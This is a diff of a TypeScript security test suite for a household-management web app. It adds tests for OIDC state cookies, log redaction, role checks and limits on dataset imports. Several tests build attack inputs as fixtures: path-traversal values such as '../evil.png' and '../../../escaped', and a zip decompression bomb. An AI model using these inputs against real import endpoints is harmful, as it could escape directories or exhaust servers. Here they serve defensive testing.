+       VALUES (?, ?, 'Stale pointer', '[]', '[]', ?, 'manual', ?, ?)`,
+      [id, houseId, foreign.data.path, stamp, stamp],
+    );
+    assert.equal((await request(`/api/recipes/${id}`, { method: "DELETE" })).status, 200);
+    assert.ok(existsSync(fileOf(foreign.data.path)), "another household's upload must survive");
+
+    // The house's own upload is still cleaned up with its recipe.
+    const own = await uploadImage(`/api/houses/${houseId}/recipes/upload`, png, "image/png", "own.png");
+    assert.equal(own.status, 201);
+    const ownRecipe = await request(`/api/houses/${houseId}/recipes`, {
+      method: "POST",
+      body: { title: "Own pointer", image: own.data.path, ingredients: [], steps: [] },
+    });
+    assert.equal(ownRecipe.status, 201);
+    assert.equal((await request(`/api/recipes/${ownRecipe.data.id}`, { method: "DELETE" })).status, 200);
+    assert.equal(existsSync(fileOf(own.data.path)), false);
+  });
+
   it("closes registration to invite-only or entirely", async () => {
     const signUp = (email: string, inviteCode?: string) =>
       request("/api/auth/register", {
@@ -6113,7 +6695,7 @@ describe("security hardening", () => {
         `${base}/api/auth/oidc/callback?code=${encodeURIComponent(authorize.searchParams.get("nonce")!)}&state=${encodeURIComponent(
           authorize.searchParams.get("state")!,
         )}`,
-        { redirect: "manual" },
+        { redirect: "manual", headers: { cookie: start.headers.get("set-cookie")!.split(";")[0] } },
       );
       assert.equal(callback.status, 302);
       assert.match(callback.headers.get("location") ?? "", /oidc_error=.*invite/);
@@ -6264,6 +6846,14 @@ describe("security hardening", () => {
     const missing = Math.min(await time("nobody-here"), await time("nobody-here"));
     const known = Math.min(await time("owner"), await time("owner"));
     assert.ok(missing > known * 0.4, `unknown ${missing.toFixed(1)}ms vs known ${known.toFixed(1)}ms`);
+  });
+
+  it("drops query strings and fragments before a URL is logged", async () => {
+    const { stripQuery } = await import("../lib/redact.js");
+    assert.equal(stripQuery("/api/auth/oidc/callback?code=abc&state=xyz"), "/api/auth/oidc/callback");
+    assert.equal(stripQuery("/api/auth/invites/CODE?x=1#frag"), "/api/auth/invites/CODE");
+    assert.equal(stripQuery("/api/houses/1/items"), "/api/houses/1/items");
+    assert.equal(stripQuery("not a url?token=secret"), "not a url");
   });
 
   it("masks card numbers, IDs and contact details in AI log previews", async () => {
@@ -6736,6 +7326,19 @@ describe("CSV inventory import", () => {
   });
 });
 
+describe("notification scan authorization", () => {
+  it("rejects a viewer and a user outside the household", async () => {
+    const owner = await request("/api/auth/register", { method: "POST", body: { name: "Scan owner", email: "scan-owner@example.com", password: "test password" } });
+    const viewer = await request("/api/auth/register", { method: "POST", body: { name: "Scan viewer", email: "scan-viewer@example.com", password: "test password" } });
+    const target = owner.data.houses[0].id;
+    await run("INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, ?, ?)", [target, viewer.data.user.id, "viewer", new Date().toISOString()]);
+    const endpoint = `/api/houses/${target}/notifications/scan`;
+    assert.equal((await request(endpoint, { method: "POST", auth: viewer.cookie!, body: {} })).status, 403);
+    assert.equal((await request(endpoint, { method: "POST", auth: cookie, body: {} })).status, 404);
+    assert.equal((await request(endpoint, { method: "POST", auth: owner.cookie!, body: {} })).status, 200);
+  });
+});
+
 describe("ownership transfer", () => {
   it("requires confirmation and a member target", async () => {
     const house = await request(`/api/houses/${houseId}`);
@@ -7129,12 +7732,19 @@ describe("two-factor authentication", () => {
     const nonce = authorize.searchParams.get("nonce")!;
     assert.ok(state && nonce);
 
+    for (const supplied of ["", "sv_oidc_state=wrong"]) {
+      const rejected = await fetch(`${base}/api/auth/oidc/callback?code=${encodeURIComponent(nonce)}&state=${encodeURIComponent(state)}`, {
+        redirect: "manual", headers: { cookie: supplied },
+      });
+      assert.match(rejected.headers.get("location") ?? "", /oidc_error=/);
+      assert.doesNotMatch(rejected.headers.get("set-cookie") ?? "", /sv_session=/);
+    }
     const callback = await fetch(`${base}/api/auth/oidc/callback?code=${encodeURIComponent(nonce)}&state=${encodeURIComponent(state)}`, {
-      redirect: "manual",
+      redirect: "manual", headers: { cookie: start.headers.get("set-cookie")!.split(";")[0] },
     });
     assert.equal(callback.status, 302);
     assert.match(callback.headers.get("location") ?? "", /sso=1/);
-    const setCookie = callback.headers.get("set-cookie")!.split(";")[0];
+    const setCookie = callback.headers.getSetCookie().find((value) => value.startsWith("sv_session="))!.split(";")[0];
     const me = await fetch(`${base}/api/auth/me`, { headers: { cookie: setCookie } });
     assert.equal(me.status, 200);
     const meData = (await me.json()) as any;
@@ -7153,7 +7763,7 @@ describe("two-factor authentication", () => {
     const nonce = authorize.searchParams.get("nonce")!;
     const callback = await fetch(
       `${base}/api/auth/oidc/callback?code=${encodeURIComponent(`unverified-${nonce}`)}&state=${encodeURIComponent(state)}`,
-      { redirect: "manual" },
+      { redirect: "manual", headers: { cookie: start.headers.get("set-cookie")!.split(";")[0] } },
     );
     assert.equal(callback.status, 302);
     assert.match(callback.headers.get("location") ?? "", /oidc_error=/);
@@ -7530,6 +8140,54 @@ describe("dataset import", () => {
     zip.file("../evil.png", png());
     const buffer = await zip.generateAsync({ type: "nodebuffer" });
     await assert.rejects(() => inspectDataset(buffer), /Unsafe archive path/);
+  });
+
+  it("caps how far a dataset archive may inflate", async () => {
+    const compressed = { compression: "DEFLATE" as const };
+    // A label file of 40 MB compresses to a few kilobytes.
+    const bomb = new JSZip();
+    bomb.file("classes.txt", "a".repeat(40 * 1024 * 1024), compressed);
+    bomb.file("train/images/a.png", png());
+    const bombBuffer = await bomb.generateAsync({ type: "nodebuffer", ...compressed });
+    assert.ok(bombBuffer.length < 1024 * 1024);
+    await assert.rejects(() => inspectDataset(bombBuffer), /too large to import/);
+
+    // An "image" that inflates past the upload limit is skipped, not written.
+    const big = new JSZip();
+    big.file("classes.txt", "apple\n");
+    big.file("train/images/a.png", Buffer.concat([png(), Buffer.alloc(20 * 1024 * 1024 + 1024)]), compressed);
+    big.file("train/images/b.png", png());
+    const result = await importDataset({
+      houseId,
+      userId: (await request("/api/auth/me")).data.user.id,
+      buffer: await big.generateAsync({ type: "nodebuffer", ...compressed }),
+      collectionName: "Oversized dataset",
+    });
+    assert.equal(result.imported, 1);
+    assert.equal(result.skipped, 1);
+    assert.match(result.errors[0].error, /too large to import/);
+
+    const crowded = new JSZip();
+    for (let index = 0; index <= 20_000; index += 1) crowded.file(`x/${index}.txt`, "");
+    await assert.rejects(async () => inspectDataset(await crowded.generateAsync({ type: "nodebuffer" })), /more than 20000 entries/);
+  });
+
+  it("rejects a dataset split override that is not a known split", async () => {
+    const zip = new JSZip();
+    zip.file("classes.txt", "apple\n");
+    zip.file("train/images/a.png", png());
+    zip.file("train/labels/a.txt", "0 0.5 0.5 0.2 0.2\n");
+    const archive = await zip.generateAsync({ type: "nodebuffer" });
+    const form = new FormData();
+    form.append("dataset", new Blob([new Uint8Array(archive)], { type: "application/zip" }), "split.zip");
+    form.append("splitOverride", "../../../escaped");
+    const response = await fetch(`${base}/api/houses/${houseId}/photos/dataset/import`, {
+      method: "POST", headers: { cookie }, body: form,
+    });
+    assert.equal(response.status, 400);
+    assert.equal((await response.json()).error, "Choose a valid dataset split");
+    const listed = await request(`/api/houses/${houseId}/photos?split=..%2F..%2F..%2Fescaped`);
+    assert.equal(listed.data.total, 0);
   });
 
   it("reads COCO annotations with absolute boxes", async () => {
@@ -10361,6 +11019,8 @@ describe("insights, household split and admin console", () => {
     assert.equal(remove.status, 403);
     assert.equal((await request("/api/admin/overview", { auth: "", headers: bearer })).status, 403);
     assert.equal((await request("/api/tokens", { auth: "", headers: bearer })).status, 403);
+    assert.equal((await request(`/api/houses/${houseId}/backup`, { auth: "", headers: bearer })).status, 403);
+    assert.equal((await request(`/api/houses/${houseId}/backups`, { auth: "", headers: bearer })).status, 403);
 
     const list = await request("/api/tokens");
     assert.equal(list.status, 200);
@@ -10937,5 +11597,17 @@ describe("bill ledger confirmation migration", () => {
       await closeDb();
       await initDb();
     }
+  });
+});
+
+describe("trust proxy setting", () => {
+  it("defaults to one hop and can be disabled for direct exposure", async () => {
+    const { trustProxySetting } = await import("../config.js");
+    assert.equal(trustProxySetting(undefined), 1);
+    assert.equal(trustProxySetting(""), 1);
+    assert.equal(trustProxySetting("false"), false);
+    assert.equal(trustProxySetting("0"), 0);
+    assert.equal(trustProxySetting("2"), 2);
+    assert.equal(trustProxySetting("loopback, 10.0.0.0/8"), "loopback, 10.0.0.0/8");
   });
 });
